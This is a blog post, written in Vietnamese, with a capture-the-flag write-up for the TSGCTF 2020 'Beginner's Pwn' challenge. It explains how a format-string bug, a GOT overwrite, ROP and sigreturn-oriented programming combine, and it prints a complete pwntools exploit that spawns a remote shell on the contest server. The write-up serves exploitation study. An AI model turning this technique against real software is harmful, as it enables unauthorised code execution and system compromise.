<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TSGCTF 2020 - Beginner&#39;s Pwn</title>
    <meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="preconnect" href="/" crossorigin>
    <link rel="stylesheet" href="/css/index.css">
    <link rel="stylesheet" href="/css/prism-tomorrow.css">
    <link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="son&#39;s blog">
    <link rel="alternate" href="/feed/feed.json" type="application/json" title="son&#39;s blog">
  </head>
  <body>
    <header>
      <h1 class="home"><a href="/">son&#39;s blog</a></h1>
      <ul class="nav">
        <li class="nav-item"><a href="/">Home</a></li>
        <li class="nav-item"><a href="/posts/">Posts</a></li>
      </ul>
    </header>

    <main class="tmpl-post">
      <h1>TSGCTF 2020 - Beginner&#39;s Pwn</h1>

<h2 id="foreword">Foreword <a class="direct-link" href="#foreword">#</a></h2>
<p>Theo như description của đề thì bài này là sự tổng hợp của các techniques như:</p>
<ul>
<li>Format String</li>
<li>GOT (Global Offset Table) overwrite</li>
<li>Buffer Overflow</li>
<li>ROP (Return-Oriented Programming)</li>
<li>sigreturn syscall (aka SROP)</li>
</ul>
<p>Thì chúng ta chỉ việc follow theo đấy mà làm thôi.</p>
<h2 id="exploit">Exploit <a class="direct-link" href="#exploit">#</a></h2>
<p><img src="/img/tsgctf-2020/main_fn.jpg" alt=""><br>
<img src="/img/tsgctf-2020/checksec.jpg" alt=""></p>
<p>Như chúng ta thấy thì NX và Canary đều được enabled (đại khái là không thể chạy shellcode và buffer overflow như bình thường). Nhưng bài này có Format String (đặc trưng của lỗi Format String là chúng ta có thể ghi được mọi address, miễn là có quyền write) nên chúng ta có thể bypass được Canary.</p>
<h3 id="idea">Idea <a class="direct-link" href="#idea">#</a></h3>
<p>Idea của em trong bài này step-by-step như sau:</p>
<ol>
<li>Overwrite <code>__stack_chk_fail</code> GOT address để tránh exit program khi đè qua canary</li>
<li>Ghi <code>format</code> string của hàm <code>scanf</code> lên section có quyền write (ở đây là .bss section)</li>
<li>Làm <code>rax=0xf</code> khi chạy qua hàm scanf để gọi <code>sys_rt_sigreturn</code> syscall</li>
<li>Craft 1 stack frame bằng <code>pwntools</code> để chạy <code>sys_execve</code> syscall</li>
</ol>
<h3 id="exploit-analyse">Exploit Analyse <a class="direct-link" href="#exploit-analyse">#</a></h3>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./beginners_pwn'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'35.221.81.216'</span><span class="token punctuation">,</span> <span class="token number">30002</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">got_table <span class="token operator">=</span> binary<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_GLOBAL_OFFSET_TABLE_'</span><span class="token punctuation">]</span></span><br><span class="highlight-line">start_main_ret <span class="token operator">=</span> <span class="token number">0x401203</span></span><br><span class="highlight-line">end_main_ret <span class="token operator">=</span> <span class="token number">0x401256</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4012c3</span></span><br><span class="highlight-line">pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x4012c1</span></span><br><span class="highlight-line">syscall <span class="token operator">=</span> <span class="token number">0x40118f</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'%7$s%s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binary<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'got.__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><br><span class="highlight-line">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>end_main_ret<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># đoạn này slice đi 1 byte cao để không bị đè với hàm ngay bên dưới __stack_chk_fail là scanf</span></span><br><span class="highlight-line">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>end_main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start_main_ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># đoạn này phải 16 bytes stack-aligned</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'%7$s%s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_table<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><br><span class="highlight-line">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%1$s'</span><span class="token operator">*</span><span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment"># ghi '%1$s' 15 lần vào .bss</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span></span><br><span class="highlight-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>got_table<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span></span><br><span class="highlight-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span></span><br><span class="highlight-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>got_table<span class="token operator">+</span><span class="token number">0x80</span><span class="token punctuation">)</span></span><br><span class="highlight-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span><br><span class="highlight-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binary<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'plt.__isoc99_scanf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><br><span class="highlight-line"><span class="token comment"># scanf(format=got_table+0x30, varargs=got_table+0x80)</span></span><br><span class="highlight-line"><span class="token comment"># sau khi nhập 15 lần '/bin/sh' (line 45) vào scanf thì lúc đó rax=0xf và nhảy vào syscall luôn</span></span><br><span class="highlight-line"><span class="token comment"># '/bin/sh' sẽ luôn được ghi vào cùng 1 địa chỉ là argument đầu tiên (ở đây chính là got_table+0x80)</span></span><br><span class="highlight-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token comment"># Setup stack frame cho Sigreturn</span></span><br><span class="highlight-line">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span></span><br><span class="highlight-line">frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0x3b</span> <span class="token comment"># sys_execve</span></span><br><span class="highlight-line">frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> got_table<span class="token operator">+</span><span class="token number">0x80</span> <span class="token comment"># '/bin/sh\x00'</span></span><br><span class="highlight-line">frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># reset rsi</span></span><br><span class="highlight-line">frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># reset rdx</span></span><br><span class="highlight-line">frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall <span class="token comment"># jump tới syscall address để gọi sys_execve</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span></span><br><span class="highlight-line">p<span class="token punctuation">.</span>sendlines<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment"># Gửi '/bin/sh\x00' 15 lần</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre>


<hr>
<ul><li>Previous: <a href="/posts/tetctf-2020-web-writeup/">TetCTF 2020 - Web</a></li>
</ul>

    </main>

    <footer></footer>

    <!-- Current page: /posts/tsgctf-2020-beginners-pwn/ -->
  </body>
</html>
